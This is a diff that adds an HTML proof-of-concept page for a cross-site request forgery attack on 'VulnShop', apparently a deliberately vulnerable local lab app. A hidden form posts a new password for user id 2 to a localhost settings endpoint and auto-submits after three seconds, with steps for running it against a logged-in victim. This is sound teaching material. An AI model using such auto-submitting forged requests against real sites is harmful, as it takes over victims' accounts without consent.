@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Demo — VulnShop</title>
+    <style>
+        body { font-family: sans-serif; max-width: 640px; margin: 2rem auto; }
+        .box { border: 1px solid #ccc; padding: 1rem; border-radius: 8px; }
+    </style>
+</head>
+<body>
+<h1>CSRF attack demo (lab only)</h1>
+<p>This page auto-submits a hidden form to change the victim's password.</p>
+<p>Steps:</p>
+<ol>
+    <li>Log in to VulnShop as <code>user</code> in another tab.</li>
+    <li>Open this HTML file while still logged in.</li>
+    <li>Password for user id=2 will change to <code>hacked123</code>.</li>
+</ol>
+
+<div class="box">
+    <form id="csrf" action="http://localhost:8080/settings/password" method="POST">
+        <input type="hidden" name="userId" value="2">
+        <input type="hidden" name="newPassword" value="hacked123">
+    </form>
+    <button onclick="document.getElementById('csrf').submit()">Trigger CSRF manually</button>
+</div>
+
+<script>
+    // Auto-submit after 3 seconds (for demo)
+    setTimeout(function () {
+        document.getElementById('csrf').submit();
+    }, 3000);
+</script>
+</body>
+</html>
